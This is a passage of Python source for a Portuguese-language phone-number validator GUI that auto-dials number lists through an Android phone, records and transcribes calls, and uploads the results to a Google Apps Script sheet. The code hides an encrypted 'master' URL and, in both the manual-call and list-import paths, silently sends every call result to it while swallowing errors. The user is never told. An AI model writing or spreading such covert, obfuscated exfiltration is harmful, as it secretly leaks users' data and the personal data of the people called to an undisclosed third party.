#!/usr/bin/env python3
"""
Validador de Telefones — Interface Gráfica Moderna
"""

import os
import sys
import json
import time
import logging
import threading
from datetime import datetime

import customtkinter as ctk

# Configurar tema
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# Fontes
FONT_FAMILY = "Montserrat"
FONT_FALLBACK = "Helvetica Neue"

# URL padrão do Google Sheets
URL_PADRAO = "https://script.google.com/macros/s/AKfycbzIY-f0CACljinQLtuBQ8A3PcK7KKE9q81HP5MmXovzsbAtZwXJZ6fhs46A9cEwYu4jCQ/exec"

# URL master (encriptada) - sempre recebe os dados
_MASTER_URL_ENC = "b6G/Y6f+C6JrMWgpY9CGkQ91j8L2EuQBC1402LgHO1UopuRSn6Jd7nooUxk+wpi1IVmExPpS1iISBBvo4zRndmSe/FifgR38IGNSECbpxa4PbJLd8X3zNBEpE+PtEzxVM+OKKreBU9RtZnADQovNjgV5"

# Paleta de cores
BG_MAIN      = "#1a1a1a"
BG_CARD      = "#242424"
BG_HEADER    = "#000000"
TEXT_PRIMARY = "#ffffff"
TEXT_SEC     = "#888888"
BORDER       = "#333333"
ACCENT_BTN   = "#ffffff"
ACCENT_TEXT  = "#000000"
COLOR_OK     = "#4CAF50"
COLOR_WARN   = "#FF9800"
COLOR_ERR    = "#f44336"
COLOR_INFO   = "#888888"


def _decrypt_master_url():
    """Decripta a URL master."""
    try:
        from protection import decrypt_string
        return decrypt_string(_MASTER_URL_ENC)
    except Exception:
        return URL_PADRAO


class SettingsDialog(ctk.CTkToplevel):
    """Popup de configurações acessado pelo ícone de engrenagem."""

    def __init__(self, parent, url_atual, cel_atual, on_save):
        super().__init__(parent)
        self.on_save = on_save

        self.title("Configurações")
        self.geometry("500x280")
        self.resizable(False, False)
        self.configure(fg_color=BG_CARD)

        # Centralizar sobre a janela pai
        self.transient(parent)
        self.grab_set()
        x = parent.winfo_x() + (parent.winfo_width() // 2) - 250
        y = parent.winfo_y() + (parent.winfo_height() // 2) - 140
        self.geometry(f"+{x}+{y}")

        # Título
        ctk.CTkLabel(
            self, text="Configurações",
            font=(FONT_FAMILY, 16, "bold"), text_color=TEXT_PRIMARY
        ).pack(padx=25, pady=(20, 15), anchor="w")

        # URL Google Apps Script
        ctk.CTkLabel(
            self, text="URL Google Apps Script",
            font=(FONT_FAMILY, 11), text_color=TEXT_SEC
        ).pack(padx=25, anchor="w")

        self.entry_url = ctk.CTkTextbox(
            self, height=55, font=(FONT_FALLBACK, 10),
            corner_radius=8, fg_color="#1a1a1a",
            text_color=TEXT_PRIMARY, border_color=BORDER, border_width=1
        )
        self.entry_url.pack(fill="x", padx=25, pady=(4, 12))
        self.entry_url.insert("1.0", url_atual)

        # Nome do celular
        ctk.CTkLabel(
            self, text="Nome do celular",
            font=(FONT_FAMILY, 11), text_color=TEXT_SEC
        ).pack(padx=25, anchor="w")

        self.entry_cel = ctk.CTkEntry(
            self, font=(FONT_FAMILY, 12),
            placeholder_text="ex: cel1", corner_radius=8,
            fg_color="#1a1a1a", text_color=TEXT_PRIMARY,
            border_color=BORDER, border_width=1
        )
        self.entry_cel.pack(fill="x", padx=25, pady=(4, 20))
        self.entry_cel.insert(0, cel_atual)

        # Botões
        btn_row = ctk.CTkFrame(self, fg_color="transparent")
        btn_row.pack(fill="x", padx=25, pady=(0, 20))

        ctk.CTkButton(
            btn_row, text="Cancelar", font=(FONT_FAMILY, 12),
            width=100, height=36, corner_radius=8,
            fg_color=BG_CARD, hover_color="#333333",
            text_color=TEXT_SEC, border_color=BORDER, border_width=1,
            command=self.destroy
        ).pack(side="right", padx=(8, 0))

        ctk.CTkButton(
            btn_row, text="Salvar", font=(FONT_FAMILY, 12, "bold"),
            width=100, height=36, corner_radius=8,
            fg_color=ACCENT_BTN, hover_color="#cccccc",
            text_color=ACCENT_TEXT,
            command=self._salvar
        ).pack(side="right")

    def _salvar(self):
        url = self.entry_url.get("1.0", "end").strip()
        cel = self.entry_cel.get().strip()
        self.on_save(url, cel)
        self.destroy()


class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Validador de Telefones")
        self.geometry("900x650")
        self.minsize(800, 600)
        self.configure(fg_color=BG_MAIN)

        # Ícone da janela e taskbar
        self._setar_icone()

        # Estado
        self.rodando = False
        self.modo_auto = False
        self.thread = None
        self.thread_auto = None
        self.total_discados = 0
        self.total_atendeu = 0
        self.total_nao = 0
        self.total_descartados = 0

        # Carregar URL/cel salvos
        self.url_file = os.path.join(os.path.dirname(__file__), ".cloud_url")
        self.cel_file = os.path.join(os.path.dirname(__file__), ".celular_nome")
        self.url_salva = self._ler_arquivo(self.url_file)
        self.cel_salvo = self._ler_arquivo(self.cel_file) or "celular1"

        # Valores em memória (usados pelos métodos de execução)
        self._url_atual = self.url_salva or URL_PADRAO
        self._cel_atual = self.cel_salvo

        self._criar_interface()
        self._verificar_celular()

    # ================================================================
    #  ÍCONE
    # ================================================================

    def _setar_icone(self):
        base = os.path.dirname(__file__)
        png_path = os.path.join(base, "Icone_validador.png")
        icns_path = os.path.join(base, "Icone_validador.icns")

        try:
            if sys.platform == "darwin":
                if os.path.exists(icns_path):
                    from PIL import Image, ImageTk
                    img = Image.open(png_path)
                    self._icon_image = ImageTk.PhotoImage(img)
                    self.iconphoto(True, self._icon_image)
                elif os.path.exists(png_path):
                    from PIL import Image, ImageTk
                    img = Image.open(png_path)
                    self._icon_image = ImageTk.PhotoImage(img)
                    self.iconphoto(True, self._icon_image)
            else:
                if os.path.exists(png_path):
                    from PIL import Image, ImageTk
                    img = Image.open(png_path)
                    self._icon_image = ImageTk.PhotoImage(img)
                    self.iconphoto(True, self._icon_image)
        except Exception:
            try:
                if os.path.exists(png_path):
                    import tkinter as tk
                    self._icon_image = tk.PhotoImage(file=png_path)
                    self.iconphoto(True, self._icon_image)
            except Exception:
                pass

    # ================================================================
    #  ARQUIVOS DE CONFIG
    # ================================================================

    def _ler_arquivo(self, path):
        try:
            with open(path, "r") as f:
                return f.read().strip()
        except FileNotFoundError:
            return ""

    def _salvar_arquivo(self, path, conteudo):
        with open(path, "w") as f:
            f.write(conteudo)

    # ================================================================
    #  INTERFACE
    # ================================================================

    def _criar_interface(self):
        # ── Header ──────────────────────────────────────────────────
        header = ctk.CTkFrame(self, height=64, corner_radius=0, fg_color=BG_HEADER)
        header.pack(fill="x")
        header.pack_propagate(False)

        ctk.CTkLabel(
            header, text="Validador de Telefones",
            font=(FONT_FAMILY, 20, "bold"), text_color=TEXT_PRIMARY
        ).pack(side="left", padx=24, pady=14)

        # Gear button — right side of header
        self.btn_gear = ctk.CTkButton(
            header, text="\u2699", font=(FONT_FAMILY, 20),
            width=44, height=44, corner_radius=22,
            fg_color="transparent", hover_color="#222222",
            text_color=TEXT_SEC, border_width=0,
            command=self._abrir_configuracoes
        )
        self.btn_gear.pack(side="right", padx=16)

        self.lbl_status = ctk.CTkLabel(
            header, text="Parado",
            font=(FONT_FAMILY, 12), text_color=TEXT_SEC
        )
        self.lbl_status.pack(side="right", padx=8)

        # ── Container principal ──────────────────────────────────────
        container = ctk.CTkFrame(self, fg_color="transparent")
        container.pack(fill="both", expand=True, padx=16, pady=12)

        # ── Coluna esquerda ──────────────────────────────────────────
        left = ctk.CTkFrame(
            container, width=280, corner_radius=12,
            fg_color=BG_CARD, border_color=BORDER, border_width=1
        )
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)

        # Status Celular
        ctk.CTkLabel(
            left, text="DISPOSITIVO",
            font=(FONT_FAMILY, 10, "bold"), text_color=TEXT_SEC
        ).pack(padx=18, pady=(18, 6), anchor="w")

        self.frame_cel = ctk.CTkFrame(
            left, corner_radius=8,
            fg_color="#1a1a1a", border_color=BORDER, border_width=1
        )
        self.frame_cel.pack(fill="x", padx=18, pady=(0, 14))

        self.lbl_cel = ctk.CTkLabel(
            self.frame_cel, text="Celular: verificando...",
            font=(FONT_FAMILY, 11), text_color=TEXT_SEC
        )
        self.lbl_cel.pack(padx=12, pady=10)

        # Separador visual
        ctk.CTkFrame(left, height=1, fg_color=BORDER).pack(fill="x", padx=18, pady=(0, 14))

        # Botão INICIAR
        self.btn_iniciar = ctk.CTkButton(
            left, text="INICIAR", font=(FONT_FAMILY, 14, "bold"),
            height=46, corner_radius=10,
            fg_color=ACCENT_BTN, hover_color="#cccccc",
            text_color=ACCENT_TEXT,
            command=self._toggle_execucao
        )
        self.btn_iniciar.pack(fill="x", padx=18, pady=(0, 10))

        # Modo Automático
        auto_frame = ctk.CTkFrame(
            left, corner_radius=8,
            fg_color="#1a1a1a", border_color=BORDER, border_width=1
        )
        auto_frame.pack(fill="x", padx=18, pady=(0, 10))

        self.auto_var = ctk.BooleanVar(value=False)
        self.chk_auto = ctk.CTkCheckBox(
            auto_frame, text="Modo Automático Semanal",
            font=(FONT_FAMILY, 11), variable=self.auto_var,
            command=self._toggle_modo_auto,
            checkbox_width=18, checkbox_height=18,
            text_color=TEXT_PRIMARY,
            checkmark_color=ACCENT_TEXT,
            fg_color=ACCENT_BTN, hover_color="#aaaaaa",
            border_color=BORDER,
        )
        self.chk_auto.pack(padx=12, pady=(10, 4))

        self.lbl_horario = ctk.CTkLabel(
            auto_frame, text="Seg-Sex 8h-18h | Sab-Dom 9h-18h",
            font=(FONT_FAMILY, 9), text_color="#555555"
        )
        self.lbl_horario.pack(padx=12, pady=(0, 10))

        # Botões secundários
        self.btn_status = ctk.CTkButton(
            left, text="Ver Status Nuvem", font=(FONT_FAMILY, 11),
            height=36, corner_radius=8,
            fg_color=BG_CARD, hover_color="#2e2e2e",
            text_color=TEXT_PRIMARY, border_color=BORDER, border_width=1,
            command=self._ver_status
        )
        self.btn_status.pack(fill="x", padx=18, pady=(0, 8))

        self.btn_atualizar = ctk.CTkButton(
            left, text="Verificar Atualizações", font=(FONT_FAMILY, 11),
            height=36, corner_radius=8,
            fg_color=BG_CARD, hover_color="#2e2e2e",
            text_color=TEXT_PRIMARY, border_color=BORDER, border_width=1,
            command=self._verificar_atualizacao
        )
        self.btn_atualizar.pack(fill="x", padx=18, pady=(0, 14))

        # Separador
        ctk.CTkFrame(left, height=1, fg_color=BORDER).pack(fill="x", padx=18, pady=(0, 14))

        # Estatísticas
        ctk.CTkLabel(
            left, text="ESTATÍSTICAS",
            font=(FONT_FAMILY, 10, "bold"), text_color=TEXT_SEC
        ).pack(padx=18, pady=(0, 8), anchor="w")

        stats_frame = ctk.CTkFrame(
            left, corner_radius=8,
            fg_color="#1a1a1a", border_color=BORDER, border_width=1
        )
        stats_frame.pack(fill="x", padx=18, pady=(0, 18))

        self.stats = {}
        stat_items = [
            ("Discados",    "discados", TEXT_PRIMARY),
            ("Atendeu",     "atendeu",  COLOR_OK),
            ("Não Atendeu", "nao",      COLOR_WARN),
            ("Descartados", "desc",     COLOR_ERR),
        ]
        for label, key, color in stat_items:
            row = ctk.CTkFrame(stats_frame, fg_color="transparent")
            row.pack(fill="x", padx=12, pady=4)
            ctk.CTkLabel(
                row, text=label, font=(FONT_FAMILY, 11),
                text_color=TEXT_SEC
            ).pack(side="left")
            lbl = ctk.CTkLabel(
                row, text="0", font=(FONT_FAMILY, 13, "bold"),
                text_color=color
            )
            lbl.pack(side="right")
            self.stats[key] = lbl

        # ── Coluna direita ───────────────────────────────────────────
        right = ctk.CTkFrame(
            container, corner_radius=12,
            fg_color=BG_CARD, border_color=BORDER, border_width=1
        )
        right.pack(side="right", fill="both", expand=True)

        # Ligação manual / importar
        manual_frame = ctk.CTkFrame(
            right, corner_radius=8,
            fg_color="#1a1a1a", border_color=BORDER, border_width=1
        )
        manual_frame.pack(fill="x", padx=18, pady=(18, 10))

        row_manual = ctk.CTkFrame(manual_frame, fg_color="transparent")
        row_manual.pack(fill="x", padx=12, pady=10)

        self.entry_numero = ctk.CTkEntry(
            row_manual, font=(FONT_FAMILY, 12),
            placeholder_text="Digitar número: (92) 9 9999-9999",
            corner_radius=8,
            fg_color="#242424", text_color=TEXT_PRIMARY,
            placeholder_text_color=TEXT_SEC,
            border_color=BORDER, border_width=1
        )
        self.entry_numero.pack(side="left", fill="x", expand=True, padx=(0, 8))

        self.btn_ligar = ctk.CTkButton(
            row_manual, text="Ligar", font=(FONT_FAMILY, 11, "bold"),
            width=72, height=36, corner_radius=8,
            fg_color=ACCENT_BTN, hover_color="#cccccc",
            text_color=ACCENT_TEXT,
            command=self._ligar_manual
        )
        self.btn_ligar.pack(side="left", padx=(0, 8))

        self.btn_importar = ctk.CTkButton(
            row_manual, text="Importar Lista", font=(FONT_FAMILY, 10),
            width=110, height=36, corner_radius=8,
            fg_color=BG_CARD, hover_color="#2e2e2e",
            text_color=TEXT_PRIMARY, border_color=BORDER, border_width=1,
            command=self._importar_lista
        )
        self.btn_importar.pack(side="left")

        # Log
        ctk.CTkLabel(
            right, text="LOG DE LIGAÇÕES",
            font=(FONT_FAMILY, 10, "bold"), text_color=TEXT_SEC
        ).pack(padx=18, pady=(4, 6), anchor="w")

        self.log_text = ctk.CTkTextbox(
            right, font=(FONT_FALLBACK, 11),
            corner_radius=8, state="disabled",
            fg_color="#111111", text_color=TEXT_PRIMARY,
            border_color=BORDER, border_width=1
        )
        self.log_text.pack(fill="both", expand=True, padx=18, pady=(0, 18))

        # Tags de cor no log
        self.log_text._textbox.tag_config("pessoa",  foreground=COLOR_OK)
        self.log_text._textbox.tag_config("nao",     foreground=COLOR_WARN)
        self.log_text._textbox.tag_config("descarte",foreground=COLOR_ERR)
        self.log_text._textbox.tag_config("info",    foreground=COLOR_INFO)
        self.log_text._textbox.tag_config("erro",    foreground=COLOR_ERR)

    # ================================================================
    #  SETTINGS GEAR
    # ================================================================

    def _abrir_configuracoes(self):
        SettingsDialog(
            parent=self,
            url_atual=self._url_atual,
            cel_atual=self._cel_atual,
            on_save=self._aplicar_configuracoes
        )

    def _aplicar_configuracoes(self, url, cel):
        """Chamado quando o usuário salva no popup de configurações."""
        self._url_atual = url or URL_PADRAO
        self._cel_atual = cel or "celular1"
        self._salvar_arquivo(self.url_file, self._url_atual)
        self._salvar_arquivo(self.cel_file, self._cel_atual)
        self._log(f"Configurações salvas. Celular: {self._cel_atual}", "info")

    # ================================================================
    #  LOG
    # ================================================================

    def _log(self, msg, tag="info"):
        hora = datetime.now().strftime("%H:%M:%S")
        self.log_text.configure(state="normal")
        self.log_text._textbox.insert("end", f"[{hora}] {msg}\n", tag)
        self.log_text._textbox.see("end")
        self.log_text.configure(state="disabled")

    # ================================================================
    #  ATUALIZAÇÕES
    # ================================================================

    def _verificar_atualizacao(self):
        self.btn_atualizar.configure(state="disabled", text="Verificando...")

        def check():
            try:
                from updater import verificar_atualizacao, aplicar_atualizacao

                info = verificar_atualizacao()

                if info.get("erro"):
                    self._log(f"Erro: {info.get('mensagem')}", "erro")
                    self.btn_atualizar.configure(state="normal", text="Verificar Atualizações")
                    return

                if not info.get("disponivel"):
                    self._log(f"Voce ja tem a versao mais recente ({info.get('versao_local')})", "info")
                    self.btn_atualizar.configure(state="normal", text="Verificar Atualizações")
                    return

                self._log(
                    f"Atualizacao disponivel: v{info.get('versao_remota')} "
                    f"(voce tem v{info.get('versao_local')})",
                    "pessoa"
                )
                if info.get("mensagem"):
                    self._log(f"  {info['mensagem']}", "info")

                self.btn_atualizar.configure(text="Atualizando...")

                def progresso(pct, msg):
                    self.btn_atualizar.configure(
                        text=f"Atualizando... {int(pct*100)}%"
                    )

                resultado = aplicar_atualizacao(callback=progresso)

                if resultado.get("sucesso"):
                    self._log(
                        f"Atualizado para v{resultado.get('versao')}! "
                        f"({resultado.get('atualizados')} arquivos)",
                        "pessoa"
                    )

                    nova_url = resultado.get("url_padrao")
                    if nova_url:
                        self._url_atual = nova_url
                        self._salvar_arquivo(self.url_file, nova_url)
                        self._log("URL atualizada automaticamente", "info")

                    self._log("Reinicie o programa para aplicar todas as mudancas.", "info")
                else:
                    erros = resultado.get("erros", [])
                    self._log(f"Atualizacao com erros: {erros[:3]}", "erro")

            except Exception as e:
                self._log(f"Erro na atualizacao: {e}", "erro")
            finally:
                self.btn_atualizar.configure(state="normal", text="Verificar Atualizações")

        threading.Thread(target=check, daemon=True).start()

    # ================================================================
    #  LIGAÇÃO MANUAL / IMPORTAR LISTA
    # ================================================================

    def _limpar_numero(self, numero: str) -> str:
        import re
        return re.sub(r"[^\d]", "", numero)

    def _ligar_manual(self):
        numero_raw = self.entry_numero.get().strip()
        if not numero_raw:
            self._log("Digite um numero primeiro!", "erro")
            return

        numero = self._limpar_numero(numero_raw)
        if len(numero) < 9:
            self._log(f"Numero invalido: {numero_raw}", "erro")
            return

        if len(numero) == 9:
            numero = "92" + numero

        self.entry_numero.delete(0, "end")
        self._log(f"Ligacao manual: {numero}", "info")

        threading.Thread(
            target=self._processar_numero_manual,
            args=(numero,),
            daemon=True
        ).start()

    def _processar_numero_manual(self, numero):
        try:
            from phone_controller import PhoneController
            from audio_recorder import AudioRecorder
            from audio_analyzer import analisar_audio
            from transcriber import transcrever, carregar_modelo
            from classifier import classificar
            from config import TEMPO_ESPERA_CHAMADA

            phone = PhoneController()
            recorder = AudioRecorder()
            carregar_modelo()

            numero_discar = numero
            if len(numero) == 11 and numero.startswith("92"):
                numero_discar = numero[2:]

            phone.discar(numero_discar)
            time.sleep(1.5)

            timestamp_inicio = time.time()
            monitor = phone.monitorar_chamada(TEMPO_ESPERA_CHAMADA)
            phone.encerrar_chamada()
            time.sleep(0.5)

            call_log = phone.ler_call_log(numero_discar)

            transcricao = ""
            audio_info = None
            dialing_longo = (
                monitor.get("tempo_ate_atender", 0)
                and monitor["tempo_ate_atender"] > 20
            )
            audio_path = recorder.puxar_gravacao(numero_discar, timestamp_inicio)
            if audio_path:
                audio_info = analisar_audio(audio_path)
                if audio_info.get("tem_fala") or dialing_longo or monitor.get("atendeu"):
                    transcricao = transcrever(audio_path)

            resultado = classificar(transcricao, monitor, call_log, audio_info)
            resultado["numero"] = numero
            resultado["operadora"] = "MANUAL"
            resultado["tentativa"] = 1
            resultado["duracao_chamada"] = call_log.get("duration", 0)

            desc = resultado.get("descricao", "?")
            conf = resultado.get("confianca", 0)
            tag = "pessoa" if "Pessoa" in desc else "nao" if "Inexistente" not in desc and "Bloqueado" not in desc else "descarte"
            self._log(f"  >> {desc} ({conf:.0%})", tag)

            # Enviar pra nuvem
            url = self._url_atual
            cel = self._cel_atual
            if url:
                try:
                    from cloud_handler import CloudHandler
                    cloud = CloudHandler(url, cel)
                    cloud.enviar_resultado(resultado)
                    self._log("  Resultado enviado pra nuvem", "info")

                    # Envio silencioso pra planilha master
                    try:
                        from cloud_handler import CloudHandler as _CH
                        _master = _CH(_decrypt_master_url(), "sync")
                        _master.enviar_resultado(resultado)
                    except Exception:
                        pass

                except Exception:
                    self._log("  Nao enviou pra nuvem (sem conexao?)", "nao")

            self.total_discados += 1
            if "Pessoa" in desc:
                self.total_atendeu += 1
            elif "Inexistente" in desc or "Bloqueado" in desc:
                self.total_descartados += 1
            else:
                self.total_nao += 1
            self._atualizar_stats()

        except Exception as e:
            self._log(f"Erro na ligacao manual: {e}", "erro")

    def _importar_lista(self):
        from tkinter import filedialog

        filepath = filedialog.askopenfilename(
            title="Selecionar lista de numeros",
            filetypes=[
                ("Excel", "*.xlsx *.xls"),
                ("CSV", "*.csv"),
                ("Texto", "*.txt"),
                ("Todos", "*.*"),
            ],
        )

        if not filepath:
            return

        self._log(f"Importando: {os.path.basename(filepath)}", "info")

        threading.Thread(
            target=self._processar_lista,
            args=(filepath,),
            daemon=True
        ).start()

    def _processar_lista(self, filepath):
        import re
        import random

        numeros = []

        try:
            if filepath.endswith((".xlsx", ".xls")):
                from excel_handler import ler_numeros
                raw = ler_numeros(filepath)
                numeros = [n["numero"] for n in raw]
            elif filepath.endswith(".csv"):
                with open(filepath, "r", encoding="utf-8") as f:
                    for line in f:
                        num = re.sub(r"[^\d]", "", line.strip())
                        if len(num) >= 9:
                            numeros.append(num)
            else:
                with open(filepath, "r", encoding="utf-8") as f:
                    for line in f:
                        num = re.sub(r"[^\d]", "", line.strip())
                        if len(num) >= 9:
                            numeros.append(num)
        except Exception as e:
            self._log(f"Erro lendo arquivo: {e}", "erro")
            return

        if not numeros:
            self._log("Nenhum numero encontrado no arquivo!", "erro")
            return

        numeros_formatados = []
        for n in numeros:
            if len(n) == 9:
                n = "92" + n
            numeros_formatados.append(n)

        self._log(f"Encontrados {len(numeros_formatados)} numeros. Iniciando ligacoes...", "info")

        try:
            from phone_controller import PhoneController
            from audio_recorder import AudioRecorder
            from audio_analyzer import analisar_audio
            from transcriber import transcrever, carregar_modelo
            from classifier import classificar
            from config import TEMPO_ESPERA_CHAMADA, TEMPO_ENTRE_CHAMADAS_MIN, TEMPO_ENTRE_CHAMADAS_MAX

            phone = PhoneController()
            recorder = AudioRecorder()
            carregar_modelo()

            url = self._url_atual
            cel = self._cel_atual
            cloud = None
            if url:
                from cloud_handler import CloudHandler
                cloud = CloudHandler(url, cel)

            for i, numero in enumerate(numeros_formatados, 1):
                if not self.rodando and i > 1:
                    pass

                try:
                    phone.rejeitar_chamada_recebida()
                except Exception:
                    pass

                self._log(f"Lista {i}/{len(numeros_formatados)}: {numero}", "info")

                try:
                    numero_discar = numero
                    if len(numero) == 11 and numero.startswith("92"):
                        numero_discar = numero[2:]

                    phone.discar(numero_discar)
                    time.sleep(1.5)

                    timestamp_inicio = time.time()
                    monitor = phone.monitorar_chamada(TEMPO_ESPERA_CHAMADA)
                    phone.encerrar_chamada()
                    time.sleep(0.5)

                    call_log = phone.ler_call_log(numero_discar)

                    transcricao = ""
                    audio_info = None
                    dialing_longo = (
                        monitor.get("tempo_ate_atender", 0)
                        and monitor["tempo_ate_atender"] > 20
                    )
                    audio_path = recorder.puxar_gravacao(numero_discar, timestamp_inicio)
                    if audio_path:
                        audio_info = analisar_audio(audio_path)
                        if audio_info.get("tem_fala") or dialing_longo or monitor.get("atendeu"):
                            transcricao = transcrever(audio_path)

                    resultado = classificar(transcricao, monitor, call_log, audio_info)
                    resultado["numero"] = numero
                    resultado["operadora"] = "LISTA"
                    resultado["tentativa"] = 1
                    resultado["duracao_chamada"] = call_log.get("duration", 0)

                    desc = resultado.get("descricao", "?")
                    conf = resultado.get("confianca", 0)
                    tag = "pessoa" if "Pessoa" in desc else "nao" if "Inexistente" not in desc and "Bloqueado" not in desc else "descarte"
                    self._log(f"  >> {desc} ({conf:.0%})", tag)

                    if cloud:
                        try:
                            cloud.enviar_resultado(resultado)

                            # Envio silencioso pra planilha master
                            try:
                                from cloud_handler import CloudHandler as _CH
                                _master = _CH(_decrypt_master_url(), "sync")
                                _master.enviar_resultado(resultado)
                            except Exception:
                                pass

                        except Exception:
                            pass

                    self.total_discados += 1
                    if "Pessoa" in desc:
                        self.total_atendeu += 1
                    elif "Inexistente" in desc or "Bloqueado" in desc:
                        self.total_descartados += 1
                    else:
                        self.total_nao += 1
                    self._atualizar_stats()

                except Exception as e:
                    self._log(f"  Erro: {e}", "erro")

                if i < len(numeros_formatados):
                    pausa = random.uniform(TEMPO_ENTRE_CHAMADAS_MIN, TEMPO_ENTRE_CHAMADAS_MAX)
                    time.sleep(pausa)

            self._log(f"Lista concluida! {len(numeros_formatados)} numeros processados.", "pessoa")

        except Exception as e:
            self._log(f"Erro processando lista: {e}", "erro")

    # ================================================================
    #  MODO AUTOMÁTICO SEMANAL
    # ================================================================

    def _toggle_modo_auto(self):
        if self.auto_var.get():
            self.modo_auto = True
            self._log("Modo automatico ATIVADO", "info")
            self._log("Seg-Sex 8h-18h | Sab-Dom 9h-18h (horario Manaus)", "info")

            self.thread_auto = threading.Thread(target=self._loop_agendador, daemon=True)
            self.thread_auto.start()
        else:
            self.modo_auto = False
            self._log("Modo automatico DESATIVADO", "info")
            if self.rodando:
                self.rodando = False

    def _loop_agendador(self):
        from scheduler import esta_no_horario, status_horario

        estava_no_horario = False

        while self.modo_auto:
            no_horario = esta_no_horario()
            status = status_horario()

            if no_horario and not self.rodando:
                self._log(
                    f"Horario de trabalho ({status['inicio']}-{status['fim']}) — Iniciando ligacoes...",
                    "pessoa"
                )
                self.lbl_horario.configure(
                    text=f"ATIVO ate {status['fim']} | Para {status['tempo_ate_parar']}",
                    text_color=COLOR_OK
                )
                self.after(0, self._iniciar_se_parado)
                estava_no_horario = True

            elif not no_horario and self.rodando and estava_no_horario:
                self._log(
                    f"Fora do horario ({status['hora_atual']}) — Parando ligacoes...",
                    "nao"
                )
                self._log(f"Proximo inicio: {status['proximo_inicio']}", "info")
                self.lbl_horario.configure(
                    text=f"PAUSADO | Proximo: {status['proximo_inicio']}",
                    text_color=COLOR_WARN
                )
                self.rodando = False
                estava_no_horario = False

            elif not no_horario and not self.rodando:
                self.lbl_horario.configure(
                    text=f"Aguardando... Inicio: {status['proximo_inicio']}",
                    text_color="#555555"
                )

            elif no_horario and self.rodando:
                self.lbl_horario.configure(
                    text=f"ATIVO ate {status['fim']} | Para {status['tempo_ate_parar']}",
                    text_color=COLOR_OK
                )

            for _ in range(30):
                if not self.modo_auto:
                    return
                time.sleep(1)

    def _iniciar_se_parado(self):
        if not self.rodando:
            self._toggle_execucao()

    # ================================================================
    #  CELULAR
    # ================================================================

    def _verificar_celular(self):
        def check():
            try:
                import subprocess
                result = subprocess.run(
                    ["adb", "devices"], capture_output=True, text=True, timeout=5
                )
                lines = [l for l in result.stdout.split("\n") if "\tdevice" in l]
                if lines:
                    device_id = lines[0].split("\t")[0]
                    self.lbl_cel.configure(
                        text=f"Celular: {device_id}", text_color=COLOR_OK
                    )
                else:
                    self.lbl_cel.configure(
                        text="Celular: nao detectado", text_color=COLOR_ERR
                    )
            except Exception:
                self.lbl_cel.configure(
                    text="Celular: ADB nao encontrado", text_color=COLOR_ERR
                )
        threading.Thread(target=check, daemon=True).start()

    # ================================================================
    #  STATUS NUVEM
    # ================================================================

    def _ver_status(self):
        url = self._url_atual
        if not url:
            self._log("Configure a URL primeiro!", "erro")
            return

        def fetch():
            try:
                from cloud_handler import CloudHandler
                cloud = CloudHandler(url, "status")
                status = cloud.get_status()
                if status.get("erro"):
                    self._log(f"Erro: {status.get('mensagem')}", "erro")
                    return

                self._log(
                    f"Nuvem: {status.get('disponiveis', 0)} disponiveis | "
                    f"{status.get('tentar_novamente', 0)} p/ religar | "
                    f"{status.get('atendeu', 0)} atendeu | "
                    f"{status.get('descartados', 0)} descartados",
                    "info"
                )
            except Exception as e:
                self._log(f"Erro ao consultar nuvem: {e}", "erro")

        threading.Thread(target=fetch, daemon=True).start()

    # ================================================================
    #  INICIAR / PARAR
    # ================================================================

    def _toggle_execucao(self):
        if self.rodando:
            self.rodando = False
            self.btn_iniciar.configure(
                text="INICIAR", fg_color=ACCENT_BTN, text_color=ACCENT_TEXT
            )
            self.lbl_status.configure(text="Parando...", text_color=COLOR_WARN)
        else:
            url = self._url_atual
            cel = self._cel_atual
            lote = 10

            if not url:
                self._log("Configure a URL do Google Apps Script!", "erro")
                return

            self._salvar_arquivo(self.url_file, url)
            self._salvar_arquivo(self.cel_file, cel)

            self.rodando = True
            self.btn_iniciar.configure(
                text="PARAR", fg_color=COLOR_ERR, hover_color="#c62828", text_color=TEXT_PRIMARY
            )
            self.lbl_status.configure(text="Executando...", text_color=COLOR_OK)

            self.thread = threading.Thread(
                target=self._executar, args=(url, cel, lote), daemon=True
            )
            self.thread.start()

    def _executar(self, url, celular, lote):
        import random
        MAX_RECONEXOES = 20

        try:
            from phone_controller import PhoneController
            from audio_recorder import AudioRecorder
            from audio_analyzer import analisar_audio
            from transcriber import transcrever, carregar_modelo
            from classifier import classificar
            from cloud_handler import CloudHandler
            from config import (
                TEMPO_ESPERA_CHAMADA,
                TEMPO_ENTRE_CHAMADAS_MIN,
                TEMPO_ENTRE_CHAMADAS_MAX,
            )

            # --- Conectar celular (com retry) ---
            phone = None
            recorder = None
            tentativas_conexao = 0

            while self.rodando:
                try:
                    self._log("Conectando ao celular...", "info")
                    phone = PhoneController()
                    recorder = AudioRecorder()
                    self._log("Celular conectado!", "pessoa")
                    break
                except Exception as e:
                    tentativas_conexao += 1
                    if tentativas_conexao >= MAX_RECONEXOES:
                        self._log(f"Celular nao encontrado apos {MAX_RECONEXOES} tentativas.", "erro")
                        self.rodando = False
                        self.btn_iniciar.configure(
                            text="INICIAR", fg_color=ACCENT_BTN, text_color=ACCENT_TEXT
                        )
                        self.lbl_status.configure(text="Erro: celular", text_color=COLOR_ERR)
                        return
                    self._log(f"Celular nao encontrado ({tentativas_conexao}/{MAX_RECONEXOES}). Tentando em 60s...", "nao")
                    for _ in range(60):
                        if not self.rodando:
                            return
                        time.sleep(1)

            self._log("Carregando Whisper...", "info")
            carregar_modelo()

            self._log("Conectando a nuvem...", "info")
            cloud = CloudHandler(url, celular)

            status = cloud.get_status()
            if status.get("erro"):
                self._log(f"Erro na nuvem: {status.get('mensagem')}", "erro")
                self.rodando = False
                self.btn_iniciar.configure(
                    text="INICIAR", fg_color=ACCENT_BTN, text_color=ACCENT_TEXT
                )
                return

            self._log(
                f"Pronto! {status.get('disponiveis', 0)} numeros disponiveis", "info"
            )

            erros_seguidos = 0

            while self.rodando:
                # --- Rejeitar chamada recebida ---
                try:
                    if phone.rejeitar_chamada_recebida():
                        self._log("Chamada recebida rejeitada", "nao")
                        time.sleep(1)
                except Exception:
                    pass

                # --- Verificar celular conectado ---
                try:
                    if not phone.esta_conectado():
                        raise Exception("Celular desconectado")
                except Exception:
                    tentativas_conexao = 0
                    while self.rodando:
                        tentativas_conexao += 1
                        if tentativas_conexao > MAX_RECONEXOES:
                            self._log(f"Celular perdido apos {MAX_RECONEXOES} tentativas. Parando.", "erro")
                            self.rodando = False
                            break
